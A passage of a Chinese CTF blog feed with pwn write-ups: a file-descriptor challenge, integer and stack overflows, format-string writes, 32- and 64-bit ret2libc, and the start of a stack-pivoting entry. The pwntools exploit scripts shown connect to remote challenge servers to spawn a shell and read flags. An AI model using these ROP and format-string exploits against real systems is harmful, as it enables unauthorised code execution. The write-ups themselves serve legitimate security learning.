<p>**特别注意:**32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数小于7的时候）<br>所以我们要找一个能够pop rdi的指令通过这句ROPgadget –binary pwn4 –only “pop|ret”可以找到，地址为0x4007d3<br><img width="769" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdafrko3j316q0h843s.jpg"></p>
<p>用命令ROPgadget –binary pwn4 –string ‘$0’  找到$0的地址0x60111f<br><img width="649" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdaeriz4j310205uwfy.jpg"></p>
<p>最后构造payload<br><img width="892" alt="image" src="https://user-images.githubusercontent.com/51265145/111448971-e89e8f80-8749-11eb-8371-a42936061572.png"><br><img width="644" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdafax04j30zs0fu766.jpg"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-pwnable.kr.fd</title>
    <url>/2020/11/24/PWN-pwnable-kr-fd/</url>
    <content><![CDATA[<p>第一次用这个oj，界面挺可爱的<br><img width="1628" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84iewij31l70u0n2e.jpg"></p>
<p>连上去，发现目录下有flag，但是没有权限打开<br><img width="827" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd83z6r6j31l70u0n2e.jpg"></p>
<p>有fd的源代码，打开看看<br><img width="824" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd85ehpvj30yx0u0n0w.jpg"></p>
<p>发现就是一个file IO的问题<br>atoi是C语言中将字符串转化为数字的函数，又有一个read，参数传的fd，0x1234 = 4660<br>那么我们让传入的参数等于4660,这样fd = argv[1] - 0x1234就为0了，这样buf的赋值就是从0位置开始，覆盖32个字节长度，最后让read输入时读入LETMEWIN，到strcmp比较时就能成功匹配了，最后得到flag:mommy! I think I know what a file descriptor is!!<br><img width="812" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84v8c2j31l70u0n2e.jpg"></p>
<p>参考wp:<a href="https://0xrick.github.io/pwn/fd/">https://0xrick.github.io/pwn/fd/</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-整数溢出&amp;栈溢出-bugku_pwn11</title>
    <url>/2020/11/24/PWN-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA-bugku-pwn11/</url>
    <content><![CDATA[<p>长度变量v2定义成无符号类型，所以可以通过溢出，让他为负值<br><img width="510" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdgx3t1xj30sc0xedjm.jpg"></p>
<p>长度溢出后，分别覆盖s字符数组、长度变量v2、循环i，特别注意是read(0,&amp;s[i],1u),每次循环读入单个字节<br><img width="497" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdgyugbyj30rm0lcgnl.jpg"></p>
<p>0x60<del>0x10覆盖数组，0x10</del>0xC都是覆盖长度变量(不管覆盖成多大都无所谓)，但是i必须要注意，read是通过s[i]来覆盖整个栈的，所以我们可以直接改变i的值，让i指向rip位置，也就是s往下98,i赋值为’c’就行，随之就是rip覆盖成getflag的起始地址就行了,hhh<br><img width="1350" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdh01b6jj31h30u0gsl.jpg"></p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0xc</span>) + <span class="string">&#x27;c&#x27;</span> + p32(<span class="number">0x080486BB</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-格式化字符串-攻防世界_实时数据检测</title>
    <url>/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<p>key是全局变量，需要将key改变为特殊值35795746才行<br><img width="512" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc5ppqpj30sg0hg0ut.jpg"></p>
<p>格式化字符串原理图:<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc6j9s2j305s0aaaac.jpg" alt="image"></p>
<p>可以看出AAAA偏离自己的首地址的地址(也就是format string)的偏移量为12<br><img width="822" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc7m0ivj319o09mq6p.jpg"></p>
<p>key变量地址:<br><img width="412" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdc6y4voj30mw0a8t9q.jpg"></p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">33670</span>)</span><br><span class="line">key_addr = <span class="number">0x804A048</span>    <span class="comment">#这是key变量的地址</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>, &#123;key_addr:<span class="number">35795746</span>&#125;)   <span class="comment">#写偏移的新方法</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-格式化字符串漏洞-攻防世界CGfsb</title>
    <url>/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCGfsb/</url>
    <content><![CDATA[<p>格式化漏洞主要利用以下几种形式:<br><img width="722" alt="image" src="https://user-images.githubusercontent.com/51265145/111449804-b4779e80-874a-11eb-9d28-1c123d1fb4f5.png"><br><img width="673" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6unv4qj311e0cs0tz.jpg"><br><img width="706" alt="image" src="https://user-images.githubusercontent.com/51265145/111449831-b8a3bc00-874a-11eb-97f4-7c485c94837f.png"><br>总结:<br>栈上存有123数据，%d,%u,%x,%p就是打印栈上的内容，也就是123，而%s就是打印栈内容上123对应的地址，其对应的地址上所保留的数据<br><img width="358" alt="image" src="https://user-images.githubusercontent.com/51265145/111449847-bccfd980-874a-11eb-8b14-8da0fa7f13c7.png"><br>例如(32位程序):<br>0x111 -&gt; a    0xa-&gt;233<br>0x112 -&gt; b    0x???-&gt;???<br>0x113 -&gt; c    0x???-&gt;???</p>
<p>前四个就是打印栈上内容a,b,c %s就是打印233</p>
<p>格式化字符串漏洞关键:找到字符串偏移量<br>调用printf函数的过程:<br>mov eax，数组首地址<br>push eax<br>call printf<br>栈情况:<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd7106v3j305s0aamxh.jpg" alt="image"></p>
<p>题目分析:<br>看保护知道栈溢出是八行的啦</p>
<p>反汇编后很明显是格式化字符串漏洞，printf(&amp;s)这种写法非常致命的,此题需要让全局变量pwnme变成8才可以<br><img width="703" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6y9ymkj30u00uigph.jpg"></p>
<p>首先找偏移量:AAAA对应0x41414141,偏移量为10<br><img width="1200" alt="image" src="https://user-images.githubusercontent.com/51265145/111449933-d6712100-874a-11eb-8aee-086ff7b5d175.png"><br>因为没有开启PIE保护，全局变量的地址是不变的，查看是0x804A068<br><img width="924" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6wkflcj31fc0rcah2.jpg"></p>
<p>EXP:<br><img width="948" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6xdhf8j31go0sqdn2.jpg"><br>当时困惑为什么payload要加上全局变量地址，后面理解了上图原理后，原来printf函数调用的时候会把数组的首地址压栈，因此写入的字符串前面得是四个字节的有效地址，否则会报错如下:<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd6z3vagj309300yq2u.jpg" alt="image"><br>要想改变pwnme全局变量就得先找到pwnme所属的空间的首地址，通过printf固定的偏移量和格式化漏洞来修改pwnme的值</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP-32位-ret2libc-攻防世界level3</title>
    <url>/2020/10/04/ROP-32%E4%BD%8D-ret2libc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Clevel3/</url>
    <content><![CDATA[<p><a href="level3.zip">题目</a></p>
<p>此题属于ROP中的ret2libc类型</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先查看保护</p>
<p>level3开启了NX保护</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/level3]</span><br><span class="line">└─<span class="comment"># checksec level3</span></span><br><span class="line">[*] <span class="string">&#x27;/home/level3/level3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>而libc_32.so.6开启了Canary、NX、PIE保护</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/level3]</span><br><span class="line">└─<span class="comment"># checksec libc_32.so.6 </span></span><br><span class="line">[*] <span class="string">&#x27;/home/level3/libc_32.so.6&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>放入ida反汇编，发现main函数首先调用了vulnerable_function，调用结束后通过write函数来打印Hello, World!</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vulnerable_function中定义了buf变量，大小为0x88字节，再write函数打印Input之后，调用了read函数，用户可以输入0x100个字节，很明显这里可以栈溢出攻击</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来想这去覆盖返回地址为system，但发现level3中没有system函数可以直接跳转的偏移地址，并且level3中也没有”/bin/sh”的地址来充当system函数的参数</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gww4w6pod9j30ks0qqgnw.jpg" alt="image-20211129171041435"></p>
<p>没有system和”/bin/sh”的地址怎么跳转，怎么办呢？这里需要了解下libc（题目的libc_32.so.6文件就是）以及got.plt的延迟绑定机制</p>
<p><strong>libc介绍</strong><br>libc是Linux下的ANSI C的函数库。<br>ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。比如write、system以及”/bin/sh”字符串等都在里面…</p>
<p><strong>GOT和PLT的作用:</strong><br>ELF文件中通常存在.GOT.PLT和.PLT这两个特殊的节，ELF编译时无法知道libc等动态链接库的加载地址。如果一个程序想调用动态链接库的函数，就必须使用.GOT.PLT和.PLT配合完成调用。<br>ELF中所有用到的外部动态链接库函数都会有对应的PLT项目<br>PLT表还是一段代码，作用是从内存中取出一个地址然后跳转。取出的地址便是函数的真实地址<br><strong>got.plt表的延迟绑定机制</strong>：.GOT.PLT表的初始化是在第一次调用该函数的过程中完成的，也就是说，某个函数必须被调用过，.GOT.PLT表中才会存放函数的真实地址</p>
<p>因此level3程序在第一次调用write函数时，plt表里没有write函数的真实地址，在调用之后，got.plt表才会<strong>存放</strong>（存放！不是等于）write函数的真实地址，而这个真实地址在libc开启了地址随机化保护（ASLR）等于基地址+write函数在libc中的偏移地址。</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a><strong>攻击思路</strong></h3><p>在理解了这些基础后，我们的攻击思路就清楚了</p>
<ul>
<li>首先前面level3程序中通过write函数打印了两次字符串，并且write函数在调用了，因此我们构造出第一次payload攻击，可以先栈溢出覆盖返回地址为write，借助于write函数打印它got.plt表中的地址（write函数的真实地址），write调用完饭回到main从头又开始</li>
<li>在发送第一次payload后，可以获取到write的真实地址，用write的真实地址减去write函数在plt表中的地址（本地获取level3中write的plt表地址）从而计算出libc运行加载的基地址base_addr</li>
<li>本地获取system、”/bin/sh”的偏移地址，计算出system、”/bin/sh”的真实地址</li>
<li>构造第二次payload实施第二次攻击最后getshell</li>
</ul>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>可以用python的函数去获取二进制文件中got、plt表的地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]        <span class="comment">#获取plt表中write地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]        <span class="comment">#获取got表中write函数地址</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]     <span class="comment">#获取的.text中的main函数地址</span></span><br></pre></td></tr></table></figure>

<p>获取”/bin/sh”字符串的地址：0x15902b</p>
<p><code>strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot;</code></p>
<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><p>第一次攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + write在plt表中的地址 + write返回时主函数地址 + write参数1fd + 要求的的offset write的地址 + 长度4</p>
<p><code>payload1 = &#39;a&#39;*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4)</code></p>
<p>write参数说明一下：</p>
<p>可以从调用write前的汇编代码看出来栈地址从小到大应该依次是fd（为1就是打印字符串）、要打印的字符串offset地址、打印字符串的长度（字节数），因此上面的payload1中0x4是因为要打印出write函数的真实地址的长度（32位占4个字节）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804849D                 push    0Eh             ; n</span><br><span class="line">.text:0804849F                 push    offset aHelloWorld ; &quot;Hello, World!\n&quot;</span><br><span class="line">.text:080484A4                 push    1               ; fd</span><br><span class="line">.text:080484A6                 call    _write</span><br></pre></td></tr></table></figure>

<h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><p>第二次攻击攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + system调用地址 + 覆盖返回地址(随意) + “参数/bin/sh地址”</p>
<p><code>payload2 = &#39;a&#39;*0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</code></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">56117</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]    </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_libc = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_libc = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot;找到sh的偏移</span></span><br><span class="line">bin_sh_libc = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + write在plt表中的地址 + write返回时主函数地址 + write参数1fd + 要求的的offset write的地址 + 长度4  </span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">res = r.recv()</span><br><span class="line">write_addr = u32(res[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">base_libc = write_addr - write_libc     <span class="comment">#计算PIE保护随机化后的基址</span></span><br><span class="line">sys_addr = base_libc + sys_libc</span><br><span class="line">bin_sh_addr = base_libc + bin_sh_libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次攻击攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + system调用地址 + 覆盖返回地址(随意) + &quot;参数/bin/sh地址&quot;</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>打通！</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gww69mzgloj30oc0kita3.jpg" alt="image-20211129175811531"></p>
]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>ROP</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP-64位-ret2libc</title>
    <url>/2021/11/30/ROP-64%E4%BD%8D-ret2libc/</url>
    <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="stack5.zip">题目</a></p>
<p>查看可执行文件stack5的保护，只开启了NX保护</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack5]</span><br><span class="line">└─<span class="comment"># checksec stack5</span></span><br><span class="line">[*] <span class="string">&#x27;/home/stack5/stack5&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>查看动态链接库libc-2.23.so的保护，开启了PIE，每次加载基地址都会随机化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack5]</span><br><span class="line">└─<span class="comment"># checksec libc-2.23.so </span></span><br><span class="line">[*] <span class="string">&#x27;/home/stack5/libc-2.23.so&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE ena</span><br><span class="line">    bled</span><br></pre></td></tr></table></figure>

<p>main函数中，打印泄露了stdout的真实地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to stack5&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is a gift: %p\n&quot;</span>, <span class="built_in">stdout</span>, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your name plz&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  print_name(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>print_name中存在栈溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, a1, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>首先获取泄露的stdout的实际地址，然后结合libc中stdout的偏移地址从而计算出libc加载的基地址，进而算出system和”/bin/sh”的实际地址，再栈溢出攻击</p>
<h2 id="编写payload"><a href="#编写payload" class="headerlink" title="编写payload"></a>编写payload</h2><p>获取”/bin/sh”在libc中的偏移地址为0x18ce17，<code>ROPgadget --binary stack5 --string &quot;/bin/sh&quot;</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack5]</span><br><span class="line">└─<span class="comment"># strings -a -t x libc-2.23.so | grep &quot;/bin/sh&quot;</span></span><br><span class="line"> 18ce17 /bin/sh</span><br></pre></td></tr></table></figure>

<p>对system和stdout在libc中偏移地址的获取建议直接ida里找了，这是最准的，我用ROPgadget找的地址不对，也不知道为什么，有师傅知道的麻烦留言或者联系我</p>
<p>放入ida中查看stdout的地址为0x3C5620</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000003C5620                 public _IO_2_1_stdout_</span><br><span class="line">.data:00000000003C5620 _IO_2_1_stdout_ db  84h                 ; DATA XREF: LOAD:00000000000088C8↑o</span><br><span class="line">.data:00000000003C5620                                         ; .data:00000000003C55A8↑o ...</span><br></pre></td></tr></table></figure>

<p>system偏移地址为0x453a0</p>
<p>因为是64位，还需要rdi_ret的地址</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack5]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack5 --only &quot;pop|ret&quot; | grep rdi</span></span><br><span class="line">0x0000000000400843 : pop rdi ; ret</span><br></pre></td></tr></table></figure>



<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;47.94.239.235&quot;</span>, <span class="number">2025</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">stdout_addr = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">stdout_addr = <span class="built_in">int</span>(stdout_addr[-<span class="number">15</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line">stdout_libc_addr = <span class="number">0x3c5620</span></span><br><span class="line">system_libc_addr = <span class="number">0x453a0</span></span><br><span class="line">sh_libc_addr = <span class="number">0x18ce17</span></span><br><span class="line"></span><br><span class="line">base_addr = stdout_addr - stdout_libc_addr</span><br><span class="line">system_addr = base_addr + system_libc_addr</span><br><span class="line">sh_addr = base_addr + sh_libc_addr</span><br><span class="line">rdi_ret_addr = <span class="number">0x400843</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>打通！</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack5]</span><br><span class="line">└─<span class="comment"># python2 exp.py </span></span><br><span class="line">[+] Opening connection to 47.94.239.235 on port 2025: Done</span><br><span class="line">0x7fb8d2262620</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$ cat home/ctf/flag</span><br><span class="line">flag&#123;a37e9c0d-234b-490f-bd63-5765e67dc12d&#125;$ </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP-花式栈溢出stack_pivoting</title>
    <url>/2021/11/29/ROP-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BAstack-pivoting/</url>
    <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="stack4">题目</a></p>
<p>查看保护</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># checksec stack4 </span></span><br><span class="line">[*] <span class="string">&#x27;/home/stack_pivoting/stack4&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序会故意泄露buf的首地址（暂且不知道有啥用）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to stack4&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift: %p\n&quot;</span>, &amp;buf, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your name plz&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  print_name(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 